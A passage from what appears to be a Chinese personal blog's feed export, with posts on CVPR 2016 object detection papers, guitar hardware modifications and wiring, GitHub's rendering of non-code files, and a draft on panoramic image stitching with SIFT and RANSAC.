<p>文章链接：<a href="http://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/Bell_Inside-Outside_Net_Detecting_CVPR_2016_paper.pdf">Inside-Outside Net: Detecting Objects in Context with Skip Pooling and Recurrent Neural Networks</a></p>
</blockquote>
<p>这个工作的主要贡献有两个，第一个是skip-connection，将deep ConvNet的多层ROI特征进行提取和融合，利用该特征对每个位置进行分类和回归，也就是inside-network。第二个贡献是如何在Fast R-CNN的基础之上增加context信息，所谓context在目标检测领域是指感兴趣的局部或全局的ROI周围的信息。为此，作者提出了IRNN的概念，也就是outside-network。</p>
<p>依靠这两个改进，ION可以在Pascal VOC 2007数据集上边提高大约5个百分点。同时也获得了COCO 2015 detection竞赛的best student entry。</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_ION.jpg-QNthin" alt="ION" title="Inside-Outside Net (ION)"></p>
<h3 id="1-3-HyperNet："><a href="#1-3-HyperNet：" class="headerlink" title="1.3.HyperNet："></a>1.3.HyperNet：</h3><blockquote>
<p>文章链接：<a href="http://www.cv-foundation.org/openaccess/content_cvpr_2016/papers/Kong_HyperNet_Towards_Accurate_CVPR_2016_paper.pdf">HyperNet: Towards Accurate Region Proposal Generation and Joint Object Detection</a></p>
</blockquote>
<p>文章的出发点为一个很重要的观察：神经网络的高层信息体现了更强的语义信息，对于识别问题较为有效；而低层的特征由于分辨率较高，对于目标定位有天然的优势，而检测问题恰恰是识别+定位，因此作者的贡献点在于如何将deep ConvNet的高低层特征进行融合，进而利用融合后的特征进行region proposal提取和进一步目标检测。不同于Faster R-CNN，文章的潜在Anchor是用类似于BING的方法通过扫描窗口的方式生成的，但利用的是CNN的特征，因此取得了更好的性能。</p>
<p>通过以上的改进策略，HyperNet可以在产生大约100个region proposal的时候保证较高的recall，同时目标检测的mAP相对于Fast R-CNN也提高了大约6个百分点。</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_HyperNet.jpg-QNthin" alt="HyperNet" title="HyperNet"></p>
<h2 id="2-识别效率"><a href="#2-识别效率" class="headerlink" title="2. 识别效率"></a>2. 识别效率</h2><h3 id="2-1-YOLO"><a href="#2-1-YOLO" class="headerlink" title="2.1. YOLO"></a>2.1. YOLO</h3><p>这是今年的oral。这个工作在识别效率方面的优势很明显，可以做到每秒钟45帧图像，处理视频是完全没有问题的。YOLO最大贡献是提出了一种全新的检测框架——直接利用CNN的全局特征预测每个位置可能的目标，相比于R-CNN系列的region proposal+CNN 这种两阶段的处理办法可以大大提高检测速度。今年新出来的SSD[11]方法虽然在识别率上边有了很大的提升，但YOLO的先驱作用是显而易见的。</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_YOLO.jpg-QNthin" alt="YOLO" title="YOLO识别框架"></p>
<h3 id="2-2-G-CNN"><a href="#2-2-G-CNN" class="headerlink" title="2.2. G-CNN"></a>2.2. G-CNN</h3><p>不管是Fast R-CNN[9]，还是Faster R-CNN，或者像HyperNet这样的变种，都需要考虑数以万计的潜在框来进行目标位置的搜索，这种方式的一个潜在问题是负样本空间非常大，因此需要一定的策略来进行抑制（不管是OHEM[8]还是region proposal方法，其本质上还是一种抑制负样本的工作）。G-CNN从另一个角度来克服这个问题。G-CNN在在初始化的时候不需要那么多框，而是通过对图像进行划分（有交叠），产生少量的框（大约180个），通过一次回归之后得到更接近物体的位置。然后以回归之后的框作为原始窗口，不断进行迭代回归调整，得到最终的检测结果。</p>
<p>经过五次调整之后，G-CNN可以达到跟Fast R-CNN相当的识别性能，但速度是Fast R-CNN的5倍（3fps）。</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_G-CNN_1.jpg-QNthin" alt="G-CNN示意图" title="G-CNN示意图"></p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_G-CNN_2.jpg-QNthin" alt="G-CNN训练过程" title="G-CNN训练过程"></p>
<h2 id="3-准确性"><a href="#3-准确性" class="headerlink" title="3. 准确性"></a>3. 准确性</h2><h3 id="3-1-LocNet"><a href="#3-1-LocNet" class="headerlink" title="3.1. LocNet"></a>3.1. LocNet</h3><p>以上提到的工作都是在做整个目标检测的框架，而LocNet在做另一件事情—如何产生更准确的bounding box?</p>
<p><img src="http://qiniu.s1nh.org/Blog_CVPR2016_LocNet.jpg-QNthin" alt="LocNet" title="LocNet"></p>
<p>在目标检测的评价体系中，有一个参数叫做IoU，简单来讲就是模型产生的目标窗口和原来标记窗口的交叠率。在Pascal VOC中，这个值为0.5。而2014年以来出现的MS COCO竞赛规则把这个IoU变成了0.5-1.0之间的综合评价值，也就是说，定位越准确，其得分越高，这也侧面反映了目标检测在评价指标方面的不断进步。</p>
<p>回到这个话题，如何产生更准确的目标位置呢？LocNet的解决方案是：针对每一个给定的初始框进行适当的放大，然后用一个CNN的网络回归出这个放大后的框包含的那个正确框的位置。为了达到这个目标，需要定义回归方式，网络以及模型，具体的细节参见[7]。</p>
<p>经过把原始的框（比如selective search生成的）进行再一次回归之后，再放入Fast R-CNN进行检测，在IoU=0.5的情况下，在Pascal VOC 数据集上mAP可以提升大约5个百分点，而IoU=0.7时可以达到13个百分点的提升，效果还是挺惊人的。</p>
<h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>目标检测是计算机视觉中基础而且热门的领域，最近两年的由于深度学习的影响产生了巨大的进步，相信在未来的一两年时间有更优秀的工作出现。</p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>CVPR</tag>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>深度改造墨标 013-4602</title>
    <url>/post/FenderModification/</url>
    <content><![CDATA[<p>也许是审美疲劳了，暑假的时候深度改造了我的琴.</p>
<p><img src="http://qiniu.s1nh.org/Blog_FenderOrigional.jpg-QNthin"></p>
<span id="more"></span>

<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><h3 id="Gotoh旋钮"><a href="#Gotoh旋钮" class="headerlink" title="Gotoh旋钮"></a>Gotoh旋钮</h3><p>更换的旋钮型号是 SG381 H.A.P-M，<em>H.A.P-M</em>的全称是<em>Height Adjustable Post with Magnum Lock</em>。这个旋钮既可以调节高度，又可以锁弦，应该是Gotoh科技含量最高的旋钮了。</p>
<p>比起510系列，SG381又有它不到一半的价格，特别亲民。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Gotoh_DSL.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Gotoh_MG.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Gotoh_HAPM.png-QNthin"></p>
<p><a href="http://www.g-gotoh.com/dl/files/Catalog2014-en.pdf">Gotoh 2014 产品目录</a></p>
<p><a href="http://www.g-gotoh.com/international/?btp_product=sg381">Gotoh SG381 官方页面</a></p>
<p><img src="http://qiniu.s1nh.org/Blog_FenderGotoh.jpg-QNthin"></p>
<h3 id="油浸电容"><a href="#油浸电容" class="headerlink" title="油浸电容"></a>油浸电容</h3><p>这个没什么好说的，心理作用。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Fender20150806Wiring.jpg-QNthin"></p>
<h3 id="Kahler琴桥"><a href="#Kahler琴桥" class="headerlink" title="Kahler琴桥"></a>Kahler琴桥</h3><p>Kahler X-trem 4300 少数派琴桥，还挺稳定的，做工一般。比起Floyd Rose，它可以调节每跟琴弦的高度，来适应9.5弧度的琴颈。</p>
<p>网上也找不到它的资料，可能国产的X-trem系列已经被放弃，或者停产了。只找到这一个页面：</p>
<p><a href="http://www.trevornewhouse.com/scripts/prodView.asp?idproduct=66">Kahler 4300</a></p>
<p><a href="http://www.wammiworld.com/kahlerparts.php">这个好像是Kahler官网</a></p>
<p><a href="http://homerecording.com/bbs/equipment-forums/guitars-and-basses/anyone-here-use-kahler-336909/">Kahler 的已知问题1</a></p>
<p><img src="http://qiniu.s1nh.org/Blog_Fender20150806Side.jpg-QNthin"></p>
<h3 id="成型后就是这样了"><a href="#成型后就是这样了" class="headerlink" title="成型后就是这样了"></a>成型后就是这样了</h3><p><img src="http://qiniu.s1nh.org/Blog_Fender20150806Main.jpg-QNthin"></p>
<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>当然，上面仅仅是刚刚开始。</p>
<p>然后，我又上网淘了一块儿蓝色硝基漆的AllParts的单块岑木(ASH)琴体；Wilkinson VS100琴桥；含有S1开关的Fender N3 Noiseless 拾音器套装。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Allparts_ASH_Body.jpg-QNthin"></p>
<h3 id="Wilkinson-琴桥"><a href="#Wilkinson-琴桥" class="headerlink" title="Wilkinson 琴桥"></a>Wilkinson 琴桥</h3><p>琴桥的型号是Wilkinson by GOTOH VS100G，在官网上找不到资料，可能是已经停产了。目前只能找到VS100N的资料</p>
<p><a href="http://www.g-gotoh.com/international/?btp_product=vs100n">VS 100N 官方页面</a></p>
<p><img src="http://qiniu.s1nh.org/Blog_VS100N-3.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Wilkinson_VS100_Bridge.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_WilkinsonMod_1.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_WilkinsonMod_2.jpg-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_WilkinsonMod_finished.jpg-QNthin"></p>
<h3 id="Fender-N3-Noiseless-With-S1-System"><a href="#Fender-N3-Noiseless-With-S1-System" class="headerlink" title="Fender N3 Noiseless With S1 System"></a>Fender N3 Noiseless With S1 System</h3><p>之前还特意研究了一下各种S1的接法</p>
<p><img src="http://qiniu.s1nh.org/Blog_N3_Noiseless_With_S1_Switch.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>Fender S-1 开关的接法</title>
    <url>/post/Fender_S-1_WiringDiagram/</url>
    <content><![CDATA[<p>最近在改造吉他的电路，搜集了一些关于拾音器电路的网站：</p>
<span id="more"></span>

<ul>
<li><a href="http://www.seymourduncan.com/support/wiring-diagrams/">Seymour Duncan wiring-diagrams/</a>：Seymour Duncan 官方的电路参考，在这里可以找到各种配置的电路，特别强大。这个网站刚刚改版，看起来比之前人性化许多。</li>
<li><a href="http://www.deluxeguitar.com/">Deluxe Guitar</a>：包含了美豪的电路、琴颈形状、旋钮、音色试听等各种信息。</li>
<li><a href="http://guitarwiring.blogspot.jp/">The Guitar Wiring Blog</a>：各种各样奇奇怪怪的吉他电路图。</li>
<li><a href="http://www.premierguitar.com/articles/Mod_Garage_The_Fender_S_1_Switching_System">Mod Garage The Fender S-1 Switching System</a>：这个帖子是介绍S-1开关的</li>
</ul>
<p>下面是从fender官网搜集的4个不同型号的Fender Deluxe St电路图：</p>
<p><a href="http://qiniu.s1nh.org/Blog_011-8102A_SISD.pdf">011-8102A_SISD.pdf</a></p>
<p><a href="http://qiniu.s1nh.org/Blog_011-9000B_SISD.pdf">011-9000B_SISD.pdf</a></p>
<p><a href="http://qiniu.s1nh.org/Blog_011-9100A_SISD.pdf">011-9100A_SISD.pdf</a></p>
<p><a href="http://qiniu.s1nh.org/Blog_Fender_Am_Dlx_Stratocaster_HSS_Shawbucker_011911XXXX_Service_Manual.pdf">Fender_011911XXXX_Service_Manual.pdf</a></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>fender</tag>
        <tag>wiring diagram</tag>
        <tag>S1</tag>
      </tags>
  </entry>
  <entry>
    <title>Github 支持除代码以外的文件格式</title>
    <url>/post/Github-non-code-files/</url>
    <content><![CDATA[<p>Github 支持图片, geoJSON, 3D模型, 表格, PDF等格式的查看和版本对比。</p>
<span id="more"></span>

<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Github可以展示图片文件，并对不同版本进行对比。支持的图片格式有 PNG, JPG, GIF, PSD, and SVG. </p>
<h3 id="展示图片"><a href="#展示图片" class="headerlink" title="展示图片"></a>展示图片</h3><p><img src="https://help.github.com/assets/images/help/images/view.png" alt="view"></p>
<p>注意：<code>SVGs don&#39;t currently support inline scripting or animation.</code></p>
<h3 id="对比不同版本的图片"><a href="#对比不同版本的图片" class="headerlink" title="对比不同版本的图片"></a>对比不同版本的图片</h3><p>有三种方法对比不同版本的图片: 2-up, swipe, and onion skin. 最后那个Onion skin很有意思</p>
<ul>
<li>2-up </li>
</ul>
<p><img src="https://help.github.com/assets/images/help/repository/images-2up-view.png" alt="2-up"></p>
<ul>
<li>Swipe</li>
</ul>
<p><img src="https://help.github.com/assets/images/help/repository/images-swipe-view.png" alt="Swipe"></p>
<ul>
<li>Onion skin</li>
</ul>
<p><img src="https://help.github.com/assets/images/help/repository/images-onion-view.gif" alt="Onion skin"></p>
<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>Github 支持 CSV（逗号分隔符） 和 TSV（Tab分隔符）格式的表格，</p>
<p><img src="https://help.github.com/assets/images/help/repository/rendered_csv.png"></p>
<h3 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h3><p><img src="https://help.github.com/assets/images/help/repository/searching_csvs.gif"></p>
<h3 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h3><p><img src="https://help.github.com/assets/images/help/repository/csv_render_error.png"></p>
<p>错误有：</p>
<ul>
<li>无法匹配分隔符。</li>
<li>超出了Github对于表格 512KB 大小的限制。</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>Github还支持<em>geoJSON地理位置数据</em>、<em>STL格式的3D文件</em>、<em>PDF文件</em>、<em>Markdown</em>等书写格式。</p>
<p>参考：<a href="https://help.github.com/categories/working-with-non-code-files/">Github Help : Working with non-code files</a></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>GuitarFreak，一个可以模拟吉他电路对频响曲线影响的软件</title>
    <url>/post/GuitarFreak/</url>
    <content><![CDATA[<p><code>GuitarFreak - guitar frequency response calculator</code></p>
<p>在《吉他中国论坛》发现了一个基于Excel的软件，可以模拟拾音器、电路、吉他连线等各环节对频响的影响。</p>
<p>下图展示了Hot Humbucker使用<strong>250K电位器（红线）</strong> 与 <strong>500K电位器（绿线）</strong>在旋钮拧到最大时频响的区别：<br><img src="http://qiniu.s1nh.org/Blog_GuitarFreak_Main.png-QNthin" alt="GuitarFreak_Main"> </p>
<span id="more"></span>

<p>下图展示了各种Tone Control的电路图<br><img src="http://qiniu.s1nh.org/Blog_GuitarFreak_Note.png-QNthin" alt="GuitarFreak_Note"></p>
<p><a href="http://bbs.guitarchina.com/forum.php?mod=viewthread&tid=1936960&pid=26404657&page=2">原帖见79楼</a></p>
<p><a href="http://qiniu.s1nh.org/Blog_GuitarFreak_5_01_040715.xlsm">下载地址</a></p>
<p>原始发布地址：<a href="http://guitarnuts2.proboards.com/thread/3627">http://guitarnuts2.proboards.com/thread/3627</a></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>wiring diagram</tag>
        <tag>GuitarFreak</tag>
      </tags>
  </entry>
  <entry>
    <title>［草稿］全景视频拼接关键技术</title>
    <url>/post/Image-mosaic-keypoint/</url>
    <content><![CDATA[<!--## 0x00-->

<blockquote>
<p>最近忙着写论文，没有时间写博客了。（说得就像会有人看一样）<br>现在的学术水平已经基本脱离“科学靠脑补、大力出奇迹”的民科状态了</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_FlowChart_1.png" title="完整的图片拼接步骤，翻译自OpenCV Stitching Pipeline"></p>
<span id="more"></span>

<h2 id="0x01-Related-Work"><a href="#0x01-Related-Work" class="headerlink" title="0x01 Related Work"></a>0x01 Related Work</h2><p><strong>[1].</strong> _Image stitching techniques for an intelligent portable aerial surveillance system: Proceedings of 2014 IEEE International Conference on Technologies for Practical Robot Applications (Apr. 2014), pp. 14–15 _</p>
<p>此文献制作了一个应用与无人机的轻量、低成本全景摄像机，把三个摄像头的视频拼接成全景图像以增加视野。通过基于Homography的方法能够支持平均15帧的拼接效率以达到实时全景的效果。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_device_IPASS.png"></p>
<p><strong>[2].</strong> _ Seamless image stitching by minimizing false edges: IEEE Trans. Image Proc., 15 (4) (Apr. 2006), pp. 969–977_</p>
<p>拼接的质量取决于图片融合后接缝的可见性，此文献对比了传统的图片融合技术对接缝的处理效果，并提出了一种新的解决方案GIST1（gradient-domain image stitching）。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_blend_1.png"></p>
<p>当两张图片没有完美的重叠部分时，GIST1算法可以得到最优的边界处理效果。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_blend_2.png"></p>
<p><strong>[3].</strong> _Fast Panorama Stitching for High-Quality Panoramic Images: IEEE Trans. Consumer Electron., 56 (2010), pp. 298–306 _</p>
<p>此文献解决了如何通过一系列连续图片制作高解析度、高质量的全景图片。提出了颜色矫正来减少图像之间的颜色差异，使用动态规划找出重叠区域最优的接缝以拼接相邻图像。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_stitch_full.png"></p>
<p><strong>[5].</strong> M. Brown, D. Lowe<strong>Automatic panoramic image stitching using invariant features</strong> Int. J. Comput. Vis., 74 (1) (2007), pp. 59–73</p>
<p>本文涉及的问题，全自动全景图像拼接。虽然一维的问题（单轴旋转）是很好的研究，二维或多行的拼接是比较困难的。以前的方法已经使用人类输入或限制的图像序列，以建立匹配的图像。在这项工作中，我们制定了拼接作为一个多图像匹配的问题，并使用不变的局部特征，以找到所有的图像之间的匹配。由于这一点，我们的方法是不敏感的输入图像的顺序，方向，规模和照明。它也不是一个全景部分图像噪声不敏感，并能识别在一个无序的图像数据集的多个全景。除了提供更多的细节，本文扩展了我们以前的工作在该地区（2003布朗和Lowe）引入增益补偿和自动校直的步骤。</p>
<p><strong>[6].</strong> R. Szeliski <strong>Image alignment and stitching: a tutorial</strong> Found. Trends Comput. Graph. Vis., 2 (2006), pp. 1–104</p>
<p>本教程回顾了图像对齐和图像拼接算法。图像对齐算法可以发现不同程度的重叠的图像之间的对应关系。他们非常适合于应用程序，如视频稳定、总结和创造的全景拼图。图像拼接算法的定位估计这样的配准算法，将图像以无缝的方式，小心处理如模糊或重影的视差和运动引起的场景以及不同的图像曝光的潜在问题。本教程介绍的基本运动模式下对准和拼接算法，介绍了有效的直接（像素）和基于特征的比对算法，并介绍了混合算法用于生产无缝拼接。它结束了在该地区的开放性研究问题的讨论。</p>
<p><strong>[14].</strong> J. Lu <strong>A load-balancing h.264 stream dispatching scheme utilized in network video monitoring system</strong> Proceedings of International Conference On Information Science and Service Science and Data Mining, Taipei (2012), pp. 678–682</p>
<p>在这项研究中，实现独立于平台的网络视频流，H.264 AVC标准作为内流系统的通信语言。然后，提出了一种新的负载均衡调度方案，并在数学上讨论的文件，以克服原生的瓶颈问题，在一个典型的网络视频系统。</p>
<p><strong>[15].</strong> Z. Chen, Y. Fang, F. Wang, Z. Li <strong>Implementation of H.264 intra-frame encoding on clustered stream architectures</strong> Proceedings of IEEE International Conference On ASIC, Shenzhen (2013), pp. 1–4</p>
<p>大多数视频采用H.264标准获得高压缩比编码。然而，高的计算复杂度和强大的数据依赖性，使实时编码困难。由于流体系结构具有丰富的运算单元和灵活可编程的，他们更适合媒体应用比ASIC和DSP。本文介绍了H.264帧内编码的聚流体系结构的实时实现。在流级和内核级的优化被认为是提高了利用率的算术单元，然后编码性能。在流水平，块与块之间的相似性，利用宏块，切片。在内核级，内核分区和内核融合相结合，得到优化的内核。实验结果表明，所提出的优化技术，提高性能显着。1080p视频编码的帧内编码速率可以达到每秒50.2帧。</p>
<p><strong>[21].</strong> W.F. Liu, J.L. Lu, Z.F. Wang, H.J. Song, X.Z. Han <strong>A High Compression Algorithm for Video Stream</strong> Proceedings of Congress on Image and Signal Processing, Sanya, Hainan (2008), pp. 287–291</p>
<p>为了减少当前和现有图像之间的相似性的视频帧序列的时间冗余度，本文提出了一种基于零树小波的非常高的压缩的新的视频编码算法。提出了一种新的方案，它采用基于帧序列中检测到的不同运动的自适应策略。用该算法实现了高逼真度的视频流的实时压缩。©IEEE 2008。</p>
<p><strong>[22].</strong> N. Mao, L. Zhuo, J. Zhang, X. Li <strong>Fast Compression Domain Video Encryption Scheme for H.264/AVC Streaming</strong> Proceedings of International Conference On Advanced Communication Technology, PyeongChang (2012), pp. 425–429</p>
<p>本文提出了一种新方法保护H.264/AVC流。已指出的压缩域视频加密的问题，并充分解决。优化安全水平和计算复杂度之间的权衡，只有在H.264/AVC流重建视频质量的最重要的位进行加密，包括帧内预测模式的编码、帧内和运动矢量差的低频DCT系数（MVD）。保持加密的流媒体格式符合H.264标准的解码器的帧内预测模式的码字加密IPME，对DCT系数的码字符号位加密和MVD的码字后缀加密信息。实验结果表明，该方案具有显着的计算效率和可靠的安全性，可以抵御不仅感性的攻击，但也蛮力攻击。因此，所提出的方案将非常适合于实时和资源有限的系统。©2012女孩。</p>
<p><strong>[23].</strong> Y. Wu, C. Liu, S. Lan, M. Yang <strong>Real-time 3D road scene based on virtual-real fusion method</strong> Sensors J. IEEE, 15 (12) (Feb. 2015)</p>
<p>道路监控在应急处置、交通事故责任认定、交通趋势分析等领域中起着至关重要的作用。本文设计了一个实时的虚拟现实融合框架的大规模场景的多视角监控，其中二维全景，卫星的纹理，和3D模型合并。该系统的实施与以下的贡献。首先，提出了一种新的多视点重叠图像自动拼接算法。相邻的相机检测到的特征点通过comotion统计地图。此外，变换模型是使用随机抽样一致性算法。其次，多视点图像演变到同一个架空的观点。最后，基于高精度地面控制点，对二维全景图像和三维场景模型进行了组合。所提出的框架已成功地应用到一个大的道路交叉口。随着虚拟现实融合的方法，观察者可以随意监控及大规模三维场景漫游的路。</p>
<p>在本文中，我们提出了一种通过对安装在经历主要平移运动的机载平台上的摄像机收集的光学数据的无缝配准来自动和有效地生成立体马赛克的新颖方法。在本文中讨论了四个关键点：1）使用平行透视表示，一对几何注册的立体马赛克可以<br>构建之前我们明确地恢复任何3D信息在相当一般的运动。 2）提出了一种PRISM（用于立体马赛克的平行光线插值）技术，使立体马赛克在运动视差的存在下无缝，并且用于相当任意的场景。提出了一种快速PRISM算法，并讨论了缝合点选择和遮挡处理的问题。 3）在约束6自由度运动下产生的平行透视立体马赛克的对极几何被公式化，其显示最佳基线，容易搜索对应和恒定深度分辨率。 4）所提出的方法<br>生成立体马赛克并且然后重建3D地图在计算和存储两者中是高效的。给出了长视频序列的实验结果。</p>
<p>本文提出了一种新的方法，从大量的图像集合计算深度图，其中相机运动已被约束为平面同心圆。我们将所得的定期视角图像集合重新采样为一组多视角全景图，然后直接从这些重新采样的图像计算深度图。由于我们的全景在三个维度上均匀地采样：旋转角，反径向距离和垂直高度，因此只需要少量的多视角全景图来获得密集和准确的3D重建。使用多视角全景图可以避免原始输入图像之间的有限重叠，从而导致常规多基线立体声出现问题。我们的方法不同于从不同位置拍摄的全景图像的立体匹配，其中对极约束是正弦曲线。对于我们的多视角全景，对极几何，一阶，由水平线组成。因此，任何传统的立体声算法可以应用于多视角全景而无需修改。实验结果表明，我们的方法生成好的深度图，可以用于基于图像的渲染任务，如视图内插和外推。</p>
<p>Omnistereo全景图包括一对全景图像，其中一个全景图用于左眼，另一全景图用于右眼。全景立体对提供了高达360度的立体感。 Omnistereo全景照片不能从两个视点的两个全向相机拍摄，但可以通过将来自旋转立体对的图像拼接在一起来构造。生成全方位全景的更方便的方法是通过拼接来自单个旋转相机的图像。这种方法还使得能够控制立体差异，为远景场景给出更大的基线，并且为更近的场景提供更小的基线。使用旋转相机捕获全景全景图像使得无法以视频速率捕获动态场景，并将全向成像限制在静止场景。因此，我们提出了两个可能性，使用光学没有任何移动部件捕获全景立体摄影。引入特殊镜，使得通过该镜观看场景产生与旋转相机所使用的相同的光线。还介绍了用于全景全景的镜头。反射镜和透镜的设计基于其腐蚀性为圆形的曲线。 Omnistereo全景图也可以通过计算机图形方法来呈现以表示虚拟环境</p>
<p> 本文提出了一种从平行投影下捕获的图像计算几何信息的新技术。平行图像对于立体重建是期望的，因为平行投影显着地减少了透视缩短。结果，基于相关性的匹配变得更有效。由于平行投影相机通常不可用，因此通过重组大的视角图像序列来构建平行图像。研究了1D和2D平行立体声的对极几何，深度恢复和投影不变性。从深度重建的不确定性分析，显示平行立体声优于常规立体立体和最近开发的用于视觉重建的多视角立体，其中均匀重建误差是平行立体声的。传统的立体重建技术，例如多基线立体声，仍然可以应用于并行立体声而没有任何修改，因为并行立体声中的核线是完全笔直的。实验结果进一步证实了我们的方法的性能。</p>
<p>图像拼接已经在近年来的许多应用中广泛使用。 [2]介绍了计算机视觉的基础知识，包括如何从相机形成图像，运动模型和常见的图像处理方法。 [3]给出了图像拼接技术的概述。它呈现了从图像获取到图像重新映射以及最终到图像混合的产生全景图像的简化流程图。 [4]介绍了使用不变特征的自动全景图像拼接方法。它提供了关于如何使用SIFT特征和RANSAC单应性估计自动拼接图像的详细算法描述。 [5]充分说明基于特征的图像拼接。这种材料中引入了关于特征提取，特征匹配，单应性估计，图像包裹和图像混合的理论。 [6]综合说明了双视图几何。本书中解释了单应性和无限单应性的概念。为了实现基于无限单应性的拼接方法，使用相机校准。 [2]和[7]介绍了从理论到实践的单摄像机校准和立体声校准。 [8]是使用OpenCV库的教程。它呈现了库提供的功能，以及这些功能如何用于实现照相机校准和图像拼接算法。</p>
<h2 id="0x02-特征匹配"><a href="#0x02-特征匹配" class="headerlink" title="0x02 特征匹配"></a>0x02 特征匹配</h2><ul>
<li>尺度不变特征转换(Scale-invariant feature transform或SIFT)是一种电脑视觉的算法用来侦测与描述影像中的局部性特征，它在空间尺度中寻找极值点，并提取出其位置、尺度、旋转不变量，此算法由 David Lowe在1999年所发表，2004年完善总结。</li>
<li>RANSAC是“RANdom SAmple Consensus（随机抽样一致）”的缩写。它可以从一组包含“局外点”的观测数据集中，通过迭代方式估计数学模型的参数。它是一种不确定的算法——它有一定的概率得出一个合理的结果；为了提高概率必须提高迭代次数。该算法最早由Fischler和Bolles于1981年提出。</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_1.png" title="原始图像"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_2.png" title="SIFT角点提取"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_3.png" title="RANSAC筛选后的角点"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_4.png" title="图像拼接"></p>
<h2 id="0x03-几何调整"><a href="#0x03-几何调整" class="headerlink" title="0x03 几何调整"></a>0x03 几何调整</h2><p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_5.png" title="寻找Z向量"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_6.png" title="未进行几何调整"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_7.png" title="几何调整后"></p>
<h2 id="0x04-增益补偿，图像融合"><a href="#0x04-增益补偿，图像融合" class="headerlink" title="0x04 增益补偿，图像融合"></a>0x04 增益补偿，图像融合</h2><p>拼接缝隙的消除可采用多频带拼接融合算法．由于多频带融合是通过将图像分解成多幅尺度图像再合成，不仅可实现整图范围内的融合过渡，并可降低对配准误差的敏感度．<br><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_12.png" title="左图为线型融合，右图为多频带融合"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_8.png" title="未完全匹配的图像"><br><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_9.png" title="没有采用增益补偿"><br><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_10.png" title="采用增益补偿"><br><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_11.png" title="采用增益补偿+多频带融合"></p>
<h2 id="0x05-拼接流程"><a href="#0x05-拼接流程" class="headerlink" title="0x05 拼接流程"></a>0x05 拼接流程</h2><p>下面是一个简略的拼接流程。</p>
<blockquote>
<p><strong>输入</strong>: n 幅图像<br><strong>I.</strong> 对全部的 n 幅图像提取角点<br><strong>II.</strong> 用 k-d 树对邻近特征进行提取<br><strong>III.</strong> For (每个图像):<br>&emsp;(i) 选择 m 幅图像进行特征匹配<br>&emsp;(ii) 对匹配好的特征执行 RANSAC 算法筛选出正确的特征点<br>&emsp;(iii) 使用概率模型验证图像匹配<br><strong>IV.</strong> 寻找匹配的图像<br><strong>V.</strong> For (每一对匹配的图像):<br>&emsp;(i) 通过旋转角 θ1, θ2, θ3 和焦距 f 执行几何调整<br>&emsp;(ii) 使用多频带融合渲染全景<br><strong>输出</strong>: 全景图像</p>
</blockquote>
<p>教科书般的流程可直接参照OpenCV源码里的<code>stitching_detailed.cpp</code></p>
<!--
## 图像拼接

全景图像拼接分为以下6个步骤。
* 角点检测：使用SIFT算法提取图片的局部特征，生成特征向量
* 角点匹配：基于DBH算法对每张图片的SIFT特征点进行匹配
* 角点提纯：RANSAC算法消除误匹配，得到帧图像拼接转换矩阵
* 图像拼接：通过转换矩阵对图像进行变换，拼接。
* 图象融合：采用加权平均法消除图像之间的接缝
* 球面变换：从平面坐标转换到全景视频的球面坐标。

![](http://qiniu.s1nh.org/Blog_Image_keypoint_temp9 "系统算法流程图“)


##球面坐标
-->
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>全景视频</tag>
        <tag>图像拼接</tag>
      </tags>
  </entry>
  <entry>
    <title>红外光学材料均匀性检测仪</title>
    <url>/post/Infrared_optical_material_detector/</url>
    <content><![CDATA[<blockquote>
